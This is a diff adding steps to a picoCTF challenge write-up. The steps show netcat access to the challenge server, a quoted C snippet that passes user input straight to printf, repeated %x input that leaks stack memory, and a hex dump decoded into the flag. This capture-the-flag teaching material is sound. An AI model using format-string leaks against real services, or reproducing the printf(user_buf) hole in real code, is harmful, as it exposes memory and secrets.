@@ -168,3 +168,42 @@ int main(int argc, char *argv[])
 
 ![image](https://user-images.githubusercontent.com/70703371/180940267-f84403c5-5c59-4f15-9731-8c0e51048347.png)
 
+3. Next, let's try to run the netcat command -> `nc mercury.picoctf.net 20195` at your kali linux terminal.
+
+> OUTPUT:
+
+![image](https://user-images.githubusercontent.com/70703371/180940551-6ab8e256-a424-4412-b34e-4fb33ac50ff7.png)
+
+4. Let's choose number 1.
+
+> OUTPUT:
+
+![image](https://user-images.githubusercontent.com/70703371/180940646-d7d1fc7b-be68-45df-b7bf-6429eb9b3326.png)
+
+5. Based from these lines of code, since there's a printf at the end of the line but no quotation mark, it's a vuln then (means we can specify a format string). For this solution, i input the `%x` as many as i want to.
+
+> %x -> it would print the output in hex format
+
+```
+char *user_buf = malloc(300 + 1);
+printf("What is your API token?\n");
+scanf("%300s", user_buf);
+printf("Buying stonks with token:\n");
+printf(user_buf);
+```
+
+![image](https://user-images.githubusercontent.com/70703371/180951019-a7a00a06-05f5-459d-9327-bef2df2ede3c.png)
+
+
+6. We got the token!
+
+```
+85c3410804b00080489c3f7f6cd80ffffffff185c1160f7f7a110f7f6cdc7085c2180285c33f085c34106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ffa5007df7fa7af8f7f7a4406064510010f7e09ce9f7f7b0c0f7f6c5c0f7f6c000ffa5c988f7dfa68df7f6c5c08048ecaffa5c9940f7f8ef09804b000f7f6c000f7f6ce20ffa5c9c8f7f94d50f7f6d89060645100f7f6c000804b000ffa5c9c88048c8685c1160ffa5c9b4ffa5c9c88048be9f7f6c3fc0ffa5ca7cffa5ca741185c116060645100ffa5c9e000f7daffa1f7f6c000f7f6c0000f7daffa11ffa5ca74ffa5ca7cffa5ca0410f7f6c000
+```
+
+7. Let's decode it using [this](https://www.binaryhexconverter.com/hex-to-ascii-text-converter) online decoder.
+
+> OUTPUT:
+
+![image](https://user-images.githubusercontent.com/70703371/180951374-c15b1de7-f57d-4d74-9337-e25f5dec52fc.png)
+
